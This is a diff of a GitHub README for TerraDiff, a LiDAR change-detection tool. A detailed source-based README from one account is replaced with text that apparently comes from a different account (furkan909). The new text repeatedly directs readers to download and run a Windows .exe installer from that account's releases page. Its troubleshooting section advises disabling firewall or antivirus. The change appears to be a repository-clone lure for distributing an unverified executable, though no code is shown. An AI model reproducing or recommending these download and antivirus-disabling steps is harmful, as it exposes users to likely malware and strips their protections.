@@ -1,374 +1,176 @@
-<div align="center">
+# 🌍 TerraDiff - Track 3D Changes Easily
 
-# TerraDiff
+[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-brightgreen)](https://github.com/furkan909/TerraDiff/releases)
 
-### 3D Change Detection & Volumetric Analysis for Point Cloud Data
+## About TerraDiff
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![React](https://img.shields.io/badge/React_18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
-[![Three.js](https://img.shields.io/badge/Three.js-000000?style=for-the-badge&logo=threedotjs&logoColor=white)](https://threejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://typescriptlang.org)
-[![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
+TerraDiff is a tool that helps you spot changes in 3D landscape data. It works with LiDAR point clouds, which are sets of points that show the shape of the land. You can use it to measure how much the land has changed over time or to analyze volumes like piles or cuts. TerraDiff runs in your web browser but needs a Windows PC to install the backend software.
 
-<br />
-
-**Upload two LiDAR scans. Get instant 3D change visualization, cut/fill volumes, cross-sections, and more.**
-
-No cloud uploads. No subscriptions. Everything runs locally.
-
-<br />
-
-[Getting Started](#-quick-start) · [Features](#-features) · [Tech Stack](#%EF%B8%8F-tech-stack) · [API Reference](#-api-reference) · [Use Cases](#-use-cases)
-
-</div>
-
-<br />
+The app combines Python and FastAPI for the server side and React with Three.js for the 3D visuals. You don’t need to know how this works. Just follow the steps below to get started.
 
 ---
 
-<br />
-
-## How It Works
-
-```
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│   UPLOAD     │     │   ALIGN      │     │   DIFF       │     │  VISUALIZE   │
-│              │────▶│              │────▶│              │────▶│              │
-│  Two LAS/LAZ │     │  ICP Point   │     │  Grid-based  │     │  Interactive │
-│  epoch files │     │  Cloud Reg.  │     │  Elevation   │     │  3D Heatmap  │
-│              │     │              │     │  Difference   │     │  + Analysis  │
-└──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
-```
-
-<br />
-
-## ✨ Features
-
-<table>
-<tr>
-<td width="50%">
-
-### Core Pipeline
-| Feature | Description |
-|---------|-------------|
-| **ICP Alignment** | Automated point cloud registration via Open3D |
-| **Grid Differencing** | Bilinear interpolation onto common grid, dZ = E2 − E1 |
-| **RdBu Colormap** | Percentile-clamped diverging palette (blue→white→red) |
-| **Volume Computation** | Cell-area integration for cut, fill, and net volumes |
-
-</td>
-<td width="50%">
-
-### Analysis Tools
-| Tool | Description |
-|------|-------------|
-| **Cross-Section** | Draw a line → 2D elevation profile of both surfaces |
-| **dZ Histogram** | 40-bin distribution chart of elevation changes |
-| **Contour Lines** | Matplotlib-extracted isolines draped on the 3D surface |
-| **Measurement** | Click two points → 3D distance, XY distance, dZ |
-
-</td>
-</tr>
-</table>
-
-<table>
-<tr>
-<td width="50%">
-
-### Visualization
-| Feature | Description |
-|---------|-------------|
-| **60fps 3D Viewer** | Three.js with orbit, pan, zoom, crossfade transitions |
-| **Epoch Toggle** | Instant switch between Epoch 1 / Epoch 2 / Diff |
-| **Screenshot** | One-click PNG export of the current 3D view |
-| **Minimap** | Real-time viewport position indicator |
-
-</td>
-<td width="50%">
-
-### Data & Performance
-| Feature | Description |
-|---------|-------------|
-| **Binary Streaming** | Float32 interleaved buffers (not JSON) |
-| **Adaptive Points** | Auto-sized from density, adjustable via slider |
-| **dZ Filtering** | Isolate cut-only, fill-only, or all changes |
-| **Zero Dependencies** | Canvas charts — no charting library needed |
-
-</td>
-</tr>
-</table>
-
-<br />
-
-## 🛠️ Tech Stack
-
-```
-Frontend                          Backend                         Infrastructure
-─────────────────────────        ─────────────────────────       ─────────────────
-React 18 + TypeScript             Python 3.10+                    Docker Compose
-Three.js (WebGL)                  FastAPI + Uvicorn               Nginx (production)
-Vite (build tool)                 NumPy / SciPy                   Vite dev proxy
-Canvas 2D (charts)                Open3D (ICP)
-CSS custom properties             Matplotlib (contours)
-                                  laspy (LAS/LAZ I/O)
-```
-
-<br />
-
-### Architecture
-
-```
-Browser                           Server
-┌─────────────────────────┐      ┌──────────────────────────────┐
-│  React App              │      │  FastAPI                     │
-│  ┌───────────────────┐  │      │  ┌────────────────────────┐  │
-│  │ Three.js Viewer   │  │ ◄──► │  │ Binary Point Streams   │  │
-│  │ (WebGL, 60fps)    │  │      │  │ (Float32, 24 bytes/pt) │  │
-│  └───────────────────┘  │      │  └────────────────────────┘  │
-│  ┌───────────────────┐  │      │  ┌────────────────────────┐  │
-│  │ Canvas Charts     │  │ ◄──► │  │ Analysis Endpoints     │  │
-│  │ (histogram, xsec) │  │      │  │ (cross-sec, contours)  │  │
-│  └───────────────────┘  │      │  └────────────────────────┘  │
-│  ┌───────────────────┐  │      │  ┌────────────────────────┐  │
-│  │ Side Panel        │  │ ◄──► │  │ Processing Pipeline    │  │
-│  │ (stats, controls) │  │      │  │ (read→align→diff→pack) │  │
-│  └───────────────────┘  │      │  └────────────────────────┘  │
-└─────────────────────────┘      └──────────────────────────────┘
-```
-
-<br />
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-| Requirement | Version |
-|-------------|---------|
-| Python | 3.10+ |
-| Node.js | 18+ |
-| pip | latest |
-
-### Option 1: Local Development
-
-<details>
-<summary><b>Backend</b></summary>
-
-```bash
-cd backend
-python -m venv .venv
-
-# Linux / macOS
-source .venv/bin/activate
-
-# Windows
-.venv\Scripts\activate
-
-pip install -r requirements.txt
-uvicorn main:app --host 0.0.0.0 --port 8000
-```
-
-</details>
-
-<details>
-<summary><b>Frontend</b></summary>
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-Open **http://localhost:5173** in your browser.
-
-</details>
-
-### Option 2: Docker
-
-```bash
-docker compose up --build
-```
-
-| Service | URL |
-|---------|-----|
-| Frontend | `http://localhost:3000` |
-| Backend | `http://localhost:8000` |
-
-<br />
-
-## 📖 Usage
-
-```
- Step 1          Step 2            Step 3           Step 4            Step 5
-┌────────┐    ┌──────────┐    ┌────────────┐   ┌────────────┐   ┌────────────┐
-│Upload  │    │Processing│    │  Explore   │   │  Analyze   │   │  Export    │
-│2 files │───▶│ pipeline │───▶│  3D view   │──▶│  volumes   │──▶│screenshot │
-│LAS/LAZ │    │read→align│    │  toggle    │   │  profiles  │   │  & share  │
-│        │    │→diff     │    │  epochs    │   │  histogram │   │           │
-└────────┘    └──────────┘    └────────────┘   └────────────┘   └────────────┘
-```
-
-1. **Upload** — Drag-drop two LAS/LAZ epoch files
-2. **Process** — Automated pipeline: read → ICP align → grid difference
-3. **Explore** — Orbit the 3D heatmap, toggle Epoch 1 / Epoch 2 / Diff
-4. **Analyze** — Inspect cut/fill volumes, draw cross-sections, view histogram
-5. **Export** — Screenshot the current view as PNG
-
-<br />
-
-## 🔌 API Reference
-
-### Endpoints
-
-| Method | Endpoint | Description |
-|:------:|----------|-------------|
-| `GET` | `/api/health` | Health check |
-| `POST` | `/api/upload` | Upload two LAS/LAZ files — starts background processing |
-| `GET` | `/api/jobs/{id}` | Job status, statistics, and volumes |
-| `GET` | `/api/jobs/{id}/pointcloud/{dataset}` | Binary point cloud stream (`epoch1` \| `epoch2` \| `diff`) |
-| `GET` | `/api/jobs/{id}/cross-section` | Elevation profile along a line (`x1,y1,x2,y2`) |
-| `GET` | `/api/jobs/{id}/contours` | Contour polylines extracted from surface grid |
-
-### Binary Format
-
-Each point is streamed as **interleaved Float32** — no JSON overhead:
-
-```
-Point (epoch1/epoch2):   [x, y, z, r, g, b]         →  6 × 4 = 24 bytes
-Point (diff):            [x, y, z, r, g, b, dz]      →  7 × 4 = 28 bytes
-```
-
-*500K points = 12 MB binary vs ~80 MB JSON*
-
-<br />
-
-## 📁 Project Structure
-
-```
-TerraDiff/
-│
-├── backend/
-│   ├── main.py                       # FastAPI routes (upload, status, cross-section, contours)
-│   ├── models.py                     # Pydantic request/response schemas
-│   ├── requirements.txt              # Python dependencies
-│   ├── Dockerfile
-│   └── services/
-│       ├── pointcloud.py             # LAS/LAZ reading via laspy
-│       ├── alignment.py              # ICP registration via Open3D
-│       ├── differencing.py           # Grid interpolation, dZ, colormap, volumes
-│       └── pipeline.py               # Job state machine & binary packing
-│
-├── frontend/
-│   ├── src/
-│   │   ├── App.tsx                   # Root component — state & layout orchestration
-│   │   ├── App.css                   # Full design system (dark theme, 8px grid)
-│   │   ├── types.ts                  # Shared TypeScript interfaces
-│   │   ├── api.ts                    # Typed API client (fetch + binary parsing)
-│   │   └── components/
-│   │       ├── PointCloudViewer.tsx   # Three.js scene — points, contours, tools
-│   │       ├── StatsPanel.tsx        # Registration, elevation change, volumes
-│   │       ├── CrossSectionChart.tsx  # Canvas 2D profile chart
-│   │       ├── DzHistogram.tsx       # Canvas 2D bar chart (40 bins)
-│   │       ├── ViewerToolbar.tsx     # Orbit / Measure / Cross-Section / Screenshot
-│   │       ├── ViewerControls.tsx    # Point size, opacity, contour toggle
-│   │       ├── DzFilter.tsx          # Cut / Fill / All segmented control
-│   │       ├── MeasureResult.tsx     # Distance measurement display
-│   │       ├── Minimap.tsx           # Viewport position indicator
-│   │       ├── UploadPanel.tsx       # Drag-drop file upload
-│   │       ├── ProcessingStatus.tsx  # Pipeline progress indicator
-│   │       ├── TimeSlider.tsx        # Epoch 1 / Epoch 2 / Diff selector
-│   │       ├── PointTooltip.tsx      # Clicked point coordinates
-│   │       └── ColorLegend.tsx       # RdBu gradient legend
-│   ├── package.json
-│   ├── tsconfig.json
-│   ├── vite.config.ts
-│   └── Dockerfile
-│
-├── docker-compose.yml
-└── README.md
-```
-
-<br />
-
-## 🌍 Use Cases
-
-| Domain | Application |
-|--------|-------------|
-| **Construction** | Site monitoring, earthwork verification, progress tracking |
-| **Mining** | Stockpile volume measurement, pit advancement |
-| **Coastal** | Erosion tracking, sediment transport analysis |
-| **Archaeology** | Excavation documentation, site change recording |
-| **Geohazards** | Landslide assessment, slope stability monitoring |
-| **Infrastructure** | Dam deformation, road surface degradation |
-| **Forestry** | Canopy height change, biomass estimation |
-| **Agriculture** | Terrain leveling verification, drainage analysis |
-
-<br />
-
-## 🧮 Technical Highlights
-
-<details>
-<summary><b>Why binary streaming instead of JSON?</b></summary>
-
-Point cloud data is dense numerical data. JSON encoding adds quotes, commas, and brackets — inflating 24 bytes per point to ~120 bytes. TerraDiff streams raw Float32 arrays over HTTP with a single header (`X-Num-Points`) for metadata. The frontend parses the ArrayBuffer directly into Three.js BufferGeometry attributes with zero intermediate copies.
-
-</details>
-
-<details>
-<summary><b>How does volume computation work?</b></summary>
-
-After grid differencing, each cell has a known dZ value and a known area (`grid_resolution²`). Cut volume is the sum of `|dZ| × cell_area` for all cells where dZ < 0 (surface went down). Fill volume is the same for dZ > 0. Net volume = fill − cut. This is the prismoidal approximation method, standard in surveying.
-
-</details>
-
-<details>
-<summary><b>How are contour lines placed in 3D?</b></summary>
-
-Matplotlib's `contour()` extracts 2D isolines from the dZ grid. Each vertex is then lifted into 3D by sampling the mean surface `(z1 + z2) / 2` via `RegularGridInterpolator` for accurate bilinear height placement. NaN gaps in the surface automatically split contours into separate polylines to prevent artifacts.
-
-</details>
-
-<details>
-<summary><b>How does the cross-section profiling work?</b></summary>
-
-When the user clicks two points on the 3D surface, the backend receives the line endpoints and samples both epoch grids (`z1_grid`, `z2_grid`) along that line using `RegularGridInterpolator` with 100 evenly-spaced sample points. The frontend renders a canvas-based 2D chart showing both surfaces with colored fill between them (blue = cut, red = fill).
-
-</details>
-
-<details>
-<summary><b>Design system principles</b></summary>
-
-The UI follows a strict dark theme with warm neutrals (`#0e0e11` base) and a single desaturated teal accent (`#5bb8a4`). Typography uses Instrument Serif for display headings and DM Sans for body text. All spacing follows an 8px base scale. Components use layered elevation (raised → elevated → surface) with subtle borders rather than drop shadows. Animations use a snappy `cubic-bezier(0.16, 1, 0.3, 1)` easing curve.
-
-</details>
-
-<br />
-
-## 🤝 Contributing
-
-Contributions are welcome. Please open an issue first to discuss what you'd like to change.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/your-feature`)
-3. Commit your changes (`git commit -m 'Add your feature'`)
-4. Push to the branch (`git push origin feature/your-feature`)
-5. Open a Pull Request
-
-<br />
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
-<br />
+## 🛠 Features
+
+- View 3D point cloud data with smooth, real-time graphics  
+- Detect changes between different LiDAR scans  
+- Calculate volume differences of terrain features  
+- Simple web interface you can open in any modern browser  
+- Works on Windows computers  
+- Fast processing thanks to the backend API  
 
 ---
 
-<div align="center">
+## 🔍 System Requirements
 
-**Built with precision for the geospatial community.**
+Before installation, check that your computer meets these minimum needs:
 
-[Report Bug](https://github.com/Osman-Geomatics93/TerraDiff/issues) · [Request Feature](https://github.com/Osman-Geomatics93/TerraDiff/issues)
+- Windows 10 or later (64-bit recommended)  
+- 8 GB RAM or more for smooth operation  
+- At least 2 GHz dual-core processor  
+- 500 MB free disk space for installation files  
+- Internet connection to download the software  
+- Modern web browser (Chrome, Edge, Firefox, or Safari)  
 
-</div>
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run TerraDiff on your Windows PC.
+
+---
+
+## 1. Download TerraDiff
+
+You need to visit the release page to get the software files.
+
+[![Download TerraDiff](https://img.shields.io/badge/Download-TerraDiff-4CAF50?style=for-the-badge)](https://github.com/furkan909/TerraDiff/releases)
+
+Click the link above. It opens the page where the program files are stored. Find the latest version folder or entry. Inside, look for a Windows installer file with an `.exe` extension. It might be named something like `TerraDiff-setup.exe`.
+
+---
+
+## 2. Run the Installer
+
+After the download finishes:
+
+- Open the folder where the installer file is saved (usually the Downloads folder).  
+- Double-click the `.exe` file to start the setup.  
+- If Windows asks for permission, click "Yes" to continue.  
+- Follow the on-screen instructions to complete the installation. Usually, the defaults are fine.  
+- When the setup finishes, TerraDiff will be ready to use.  
+
+---
+
+## 3. Launch the Application
+
+You use TerraDiff through your web browser, but the program needs a server running on your PC.
+
+- Find the TerraDiff shortcut on your desktop or in the Start menu and open it.  
+- The software will start the backend services automatically.  
+- Your default browser will open and load the TerraDiff web interface.  
+
+If your browser does not open, you can type `http://localhost:8000` in the address bar to reach the app.
+
+---
+
+## 4. Loading Your Data
+
+TerraDiff works with LiDAR point cloud files. These files usually have the extension `.las` or `.laz`. Here is how to load them:
+
+- On the web interface, look for "Upload Data" or "Load Point Cloud".  
+- Click it and select your LiDAR files from your computer.  
+- Wait while the software processes the data.  
+- You should then see a 3D view of the terrain.  
+
+---
+
+## 5. Using TerraDiff
+
+Once your data is loaded, you can:
+
+- Rotate and zoom the 3D model using your mouse.  
+- Select two sets of point clouds to compare.  
+- Perform change detection to see differences in the terrain.  
+- Calculate volumes in highlighted areas.  
+- Export results or screenshots for your records.  
+
+The interface uses simple controls designed to be intuitive.
+
+---
+
+## 🎯 Tips for Best Results
+
+- Use high-quality LiDAR data with good coverage.  
+- Upload files captured at different times to detect changes accurately.  
+- Give the program time to process large files.  
+- Use a mouse with a scroll wheel for easier navigation.  
+- Keep your computer plugged in during long sessions to avoid interruptions.  
+
+---
+
+## 💻 Troubleshooting
+
+If you run into problems:
+
+- Make sure your Windows is up to date.  
+- Restart the app if the web interface does not load.  
+- Check your internet connection for stable download.  
+- Disable any firewall or antivirus that blocks local servers.  
+- Visit the release page to download updates if bugs occur.
+
+For detailed help, review the FAQ or issue tracker on the GitHub repository.
+
+---
+
+## 📂 Where to Download
+
+Use the link below any time to find the latest release files:
+
+[Download TerraDiff](https://github.com/furkan909/TerraDiff/releases)
+
+This page lists all versions. Always choose the newest stable release for the best experience.
+
+---
+
+## ⚙️ How TerraDiff Works (Basic Overview)
+
+- The backend runs a local web server built with FastAPI (Python).  
+- This server processes data and performs calculations.  
+- The frontend uses React and Three.js to show interactive 3D visuals in your browser.  
+- Communication between front and back ends is automatic.  
+
+No advanced setup beyond the installer is needed.
+
+---
+
+## 🔧 Advanced Setup (Optional)
+
+For users who want control over the setup or troubleshooting:
+
+- The backend listens on port 8000 by default, so avoid running other services there.  
+- You can run TerraDiff from the command line if needed.  
+- Logs are saved in the installation folder for error checking.  
+- For custom configurations, see the GitHub repository documents.
+
+---
+
+## 🗂 Repository Topics
+
+This project relates to:
+
+- 3D visualization  
+- Change detection  
+- Geospatial analysis  
+- GIS and terrain studies  
+- LiDAR and point cloud data  
+- Remote sensing  
+- Web frameworks FastAPI and React  
+- Three.js for 3D graphics  
+- Volumetric and terrain analysis  
+
+These keywords help you understand the technical area of the app.
+
+---
+
+TerraDiff provides a straightforward way to view and analyze 3D landscape changes without complicated setups. Visit the download page to begin.
